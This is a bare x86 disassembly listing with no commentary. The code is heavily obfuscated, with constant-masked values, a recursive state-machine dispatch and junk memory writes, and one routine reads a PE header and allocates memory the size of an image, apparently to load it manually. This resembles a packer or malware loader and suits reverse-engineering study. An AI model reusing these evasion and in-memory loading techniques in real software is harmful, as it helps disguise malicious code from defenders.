  429028:	mov    DWORD PTR [ebp+0x18],eax
  42902b:	push   DWORD PTR [ebp-0x50]
  42902e:	push   DWORD PTR [ebp+0x18]
  429031:	mov    eax,DWORD PTR [ebp-0x54]
  429034:	add    eax,DWORD PTR [ebp-0x20]
  429037:	push   eax
  429038:	call   0x4282df
  42903d:	mov    eax,DWORD PTR [ebp+0x8]
  429040:	mov    ecx,DWORD PTR [ebp-0x18]
  429043:	xor    eax,edi
  429045:	add    eax,ebx
  429047:	cmp    eax,ecx
  429049:	je     0x42905c
  42904b:	push   0x0
  42904d:	push   DWORD PTR [ebp-0x50]
  429050:	mov    eax,DWORD PTR [ebp-0x54]
  429053:	add    eax,DWORD PTR [ebp-0x20]
  429056:	push   eax
  429057:	call   0x4288c5
  42905c:	mov    eax,DWORD PTR [ebp-0x24]
  42905f:	mov    ecx,DWORD PTR [ebp-0x50]
  429062:	add    DWORD PTR [eax],ecx
  429064:	mov    eax,DWORD PTR [ebp-0x50]
  429067:	add    eax,DWORD PTR [ebp+0x1c]
  42906a:	mov    DWORD PTR [ebp+0x1c],eax
  42906d:	mov    eax,DWORD PTR [ebp-0x8]
  429070:	mov    ecx,DWORD PTR [ebp+0x1c]
  429073:	xor    eax,edi
  429075:	add    eax,ebx
  429077:	imul   eax,ecx
  42907a:	mov    ecx,DWORD PTR [ebp+0x8]
  42907d:	mov    edx,DWORD PTR [ebp-0x28]
  429080:	xor    ecx,edi
  429082:	lea    ecx,[ecx+edx*1+0x3272f5]
  429089:	cmp    eax,ecx
  42908b:	jb     0x428ce9
  429091:	mov    esi,DWORD PTR [ebp+0x14]
  429094:	mov    eax,DWORD PTR [ebp-0x20]
  429097:	mov    DWORD PTR [esi],eax
  429099:	jmp    0x4290e0
  42909b:	mov    ecx,DWORD PTR [ebp+0x8]
  42909e:	mov    edx,DWORD PTR [ebp+0xc]
  4290a1:	xor    ecx,edi
  4290a3:	xor    edx,edi
  4290a5:	add    ecx,ebx
  4290a7:	add    edx,ebx
  4290a9:	cmp    ecx,edx
  4290ab:	jne    0x4290bf
  4290ad:	mov    eax,ds:0x7f642ddc
  4290b2:	imul   eax,eax,0x9f15fccf
  4290b8:	mov    ds:0x7f642ddc,eax
  4290bd:	jmp    0x4290e0
  4290bf:	mov    ecx,DWORD PTR [ebp+0x8]
  4290c2:	xor    ecx,edi
  4290c4:	add    ecx,ebx
  4290c6:	cmp    eax,ecx
  4290c8:	je     0x4290d6
  4290ca:	sub    DWORD PTR ds:0xf861e3c,0x709beac4
  4290d4:	jmp    0x4290e0
  4290d6:	and    DWORD PTR ds:0x3343fadc,0x5265ec3f
  4290e0:	pop    edi
  4290e1:	pop    esi
  4290e2:	pop    ebx
  4290e3:	leave  
  4290e4:	ret    0x18
  4290e7:	push   ebp
  4290e8:	mov    ebp,esp
  4290ea:	and    esp,0xfffffff8
  4290ed:	mov    eax,DWORD PTR [ebp+0x20]
  4290f0:	sub    esp,0x14
  4290f3:	push   ebx
  4290f4:	mov    ebx,DWORD PTR [ebp+0x14]
  4290f7:	push   esi
  4290f8:	push   edi
  4290f9:	cmp    eax,0xf89c85a5
  4290fe:	jne    0x42910a
  429100:	push   0xf89c85a2
  429105:	jmp    0x42923c
  42910a:	mov    eax,DWORD PTR [ebp+0x20]
  42910d:	cmp    eax,0xf89c85a2
  429112:	jne    0x42911e
  429114:	push   0xf89c85a3
  429119:	jmp    0x42923c
  42911e:	mov    eax,DWORD PTR [ebp+0x20]
  429121:	cmp    eax,0xf89c85a3
  429126:	jne    0x429132
  429128:	push   0xf89c85a0
  42912d:	jmp    0x42923c
  429132:	mov    eax,DWORD PTR [ebp+0x20]
  429135:	cmp    eax,0xf89c85a0
  42913a:	jne    0x429146
  42913c:	push   0xf89c85a1
  429141:	jmp    0x42923c
  429146:	mov    ecx,DWORD PTR [ebp+0x20]
  429149:	mov    eax,0xf89c85bc
  42914e:	cmp    ecx,eax
  429150:	jne    0x42920c
  429156:	mov    eax,DWORD PTR [ebp+0x10]
  429159:	mov    DWORD PTR [esp+0xc],eax
  42915d:	mov    eax,DWORD PTR [ebp+0x18]
  429160:	mov    DWORD PTR [esp+0x14],eax
  429164:	mov    eax,DWORD PTR [ebp+0xc]
  429167:	mov    DWORD PTR [esp+0x18],eax
  42916b:	mov    eax,DWORD PTR [ebp+0x8]
  42916e:	mov    DWORD PTR [esp+0x10],eax
  429172:	mov    eax,DWORD PTR [esp+0x10]
  429176:	mov    ecx,DWORD PTR [esp+0x14]
  42917a:	mov    edi,0x75108ae
  42917f:	xor    eax,edi
  429181:	mov    esi,0x3272f5
  429186:	add    eax,esi
  429188:	mov    DWORD PTR [ecx],eax
  42918a:	mov    eax,DWORD PTR [esp+0xc]
  42918e:	mov    eax,DWORD PTR [eax+0x194]
  429194:	mov    ecx,DWORD PTR [eax]
  429196:	mov    eax,DWORD PTR [esp+0xc]
  42919a:	mov    eax,DWORD PTR [eax+0x194]
  4291a0:	mov    eax,DWORD PTR [eax]
  4291a2:	add    eax,DWORD PTR [ecx+0x3c]
  4291a5:	mov    ecx,DWORD PTR [esp+0xc]
  4291a9:	mov    ecx,DWORD PTR [ecx+0x1e0]
  4291af:	mov    ecx,DWORD PTR [ecx+0x14]
  4291b2:	push   0x4
  4291b4:	push   0x3000
  4291b9:	push   DWORD PTR [eax+0x50]
  4291bc:	push   0x0
  4291be:	call   ecx
  4291c0:	mov    DWORD PTR [ebx],eax
  4291c2:	mov    eax,DWORD PTR [esp+0x10]
  4291c6:	push   DWORD PTR [esp+0xc]
  4291ca:	xor    eax,edi
  4291cc:	add    eax,esi
  4291ce:	mov    DWORD PTR [esp+0x20],eax
  4291d2:	lea    eax,[esp+0x20]
  4291d6:	push   eax
  4291d7:	push   ebx
  4291d8:	push   DWORD PTR [esp+0x20]
  4291dc:	push   DWORD PTR [esp+0x28]
  4291e0:	push   DWORD PTR [esp+0x24]
  4291e4:	call   0x428ba9
  4291e9:	mov    eax,DWORD PTR [esp+0x10]
  4291ed:	mov    ecx,DWORD PTR [ebx]
  4291ef:	xor    eax,edi
  4291f1:	add    eax,esi
  4291f3:	cmp    ecx,eax
  4291f5:	je     0x429253
  4291f7:	mov    eax,DWORD PTR [esp+0x18]
  4291fb:	mov    ecx,DWORD PTR [esp+0x14]
  4291ff:	xor    eax,edi
  429201:	add    eax,esi
  429203:	imul   eax,DWORD PTR [esp+0x1c]
  429208:	mov    DWORD PTR [ecx],eax
  42920a:	jmp    0x429253
  42920c:	mov    ecx,DWORD PTR [ebp+0x20]
  42920f:	cmp    ecx,0xf89c85a1
  429215:	jne    0x42921e
  429217:	push   0xf89c85be
  42921c:	jmp    0x42923c
  42921e:	mov    ecx,DWORD PTR [ebp+0x20]
  429221:	cmp    ecx,0xf89c85be
  429227:	jne    0x429230
  429229:	push   0xf89c85bf
  42922e:	jmp    0x42923c
  429230:	mov    ecx,DWORD PTR [ebp+0x20]
  429233:	cmp    ecx,0xf89c85bf
  429239:	jne    0x429253
  42923b:	push   eax
  42923c:	push   DWORD PTR [ebp+0x1c]
  42923f:	push   DWORD PTR [ebp+0x18]
  429242:	push   ebx
  429243:	push   DWORD PTR [ebp+0x10]
  429246:	push   DWORD PTR [ebp+0xc]
  429249:	push   DWORD PTR [ebp+0x8]
  42924c:	call   0x4290e7
  429251:	mov    DWORD PTR [ebx],eax
  429253:	mov    eax,DWORD PTR [ebx]
  429255:	pop    edi
  429256:	pop    esi
  429257:	pop    ebx
  429258:	mov    esp,ebp
  42925a:	pop    ebp
  42925b:	ret    0x1c
  42925e:	push   ebp
  42925f:	mov    ebp,esp
  429261:	sub    esp,0xc
  429264:	mov    eax,0xf89c85a5
  429269:	mov    DWORD PTR [ebp-0x8],eax
  42926c:	mov    DWORD PTR [ebp-0xc],0xf89c85a2
  429273:	mov    ecx,DWORD PTR [ebp-0x8]
  429276:	xor    ecx,0x75108ae
  42927c:	add    ecx,0x3272f5
  429282:	mov    DWORD PTR [ebp-0x4],ecx
  429285:	mov    ecx,DWORD PTR [ebp+0xc]
  429288:	push   eax
  429289:	mov    DWORD PTR [ebp+0xc],ecx
  42928c:	push   DWORD PTR [ebp+0xc]
  42928f:	lea    eax,[ebp-0x4]
  429292:	push   DWORD PTR [ebp+0x8]
  429295:	push   eax
  429296:	push   DWORD PTR [ebp+0xc]
  429299:	push   DWORD PTR [ebp-0xc]
  42929c:	push   DWORD PTR [ebp-0x8]
  42929f:	call   0x4290e7
  4292a4:	mov    DWORD PTR [ebp-0x4],eax
  4292a7:	mov    eax,DWORD PTR [ebp-0x4]
  4292aa:	leave  
  4292ab:	ret    0x8
